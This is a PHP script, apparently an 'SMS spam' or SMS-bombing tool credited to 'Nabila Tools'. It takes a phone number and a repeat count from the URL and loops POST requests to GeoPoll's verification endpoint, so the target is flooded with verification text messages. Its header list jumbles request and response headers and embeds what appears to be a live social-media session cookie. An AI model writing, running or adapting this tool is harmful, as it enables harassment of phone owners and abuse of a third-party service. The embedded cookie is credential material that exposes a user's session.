
<?php

/* 
icq Spam Sms
C0ded by : Muhammad Ikhsan f.t Achmad Rivaldi
Github  : https://github.com/thaniaanatasya
Admin Nabila Tools
*/
if(!$_GET['no']){ 
echo "Nabila Tools SMS geo";
}else{
$loop = $_GET['loop'];
$no = $_GET['no'];
            $header = array(
		    'GET /Home/SendVerification?mobileNumber=6283815355337&pollId=0&pollSource= HTTP/1.1',
		    'Host: m.geopoll.com:443',
		    'User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36',
		    'Accept: */*',
		    'Accept-Language: en-US,en;q=0.5',
		    'Accept-Encoding: gzip, deflate, br',
		    'Content-Type: application/x-www-form-urlencoded',
		    'Referer: https://m.geopoll.com/',
		    'Content-Length: 106',
		    'Origin: https://m.geopoll.com/',
		    'Connection: keep-alive',
		    'HTTP/1.1 200 OK',
		    'Server: nginx',
		    'Date: Tue, 15 May 2018 21:55:12 GMT',
		    'Content-Type: application/json',
		    'Transfer-Encoding: chunked',
		    'Connection: keep-alive',
		    'Keep-Alive: timeout=75',
		    'Vary: Accept-Encoding',
		    'X-Powered-By: PHP/5.6.34',
		    'Access-Control-Allow-Origin: https://web.icq.com',
		    'Access-Control-Allow-Credentials: true',
		    'Cookie: datr=oTb4Wk03vcwr6eNpTVM4sNFk; sb=oTb4WhVJ1-X9flXWegiItVFh; pl=n; c_user=100003085451013; xs=47%3A5Lzl9Ry51-OLZQ%3A2%3A1527178000%3A18699%3A11262; fr=0BahAXmDYTRsvE3qg.AWXDgNxc3TkV6fbQa2yhrGKK7mM.Ba-Dag.KK.FsG.0.0.BbCPVC.AWUXaf-U; act=1527314056379%2F12; wd=1024x508; presence=EDvF3EtimeF1527315368EuserFA21B03085451013A2EstateFDutF1527315368984CEchFDp_5f1B03085451013F12CC',
		    'X-XSS-Protection: 1; mode=block; report=https://cspreport.mail.ru/xxssprotection',
		    'X-Content-Type-Options: nosniff',
		    'X-Frame-Options: SAMEORIGIN',
		    'Strict-Transport-Security: max-age=600; includeSubDomains; preload',
		    'Content-Encoding: gzip',);
    function http($postdata){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://m.geopoll.com/Home/SendVerification');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        if(!empty($postdata)){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        $response = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return array($http, $response);
    }
    for ($x = 0;$x <= $loop ;$x++) {
    http("mobileNumber=".$no."&pollId=0&pollSource="); 
    echo "Sms ke ".$no." Sukses<br>";
}
}

?>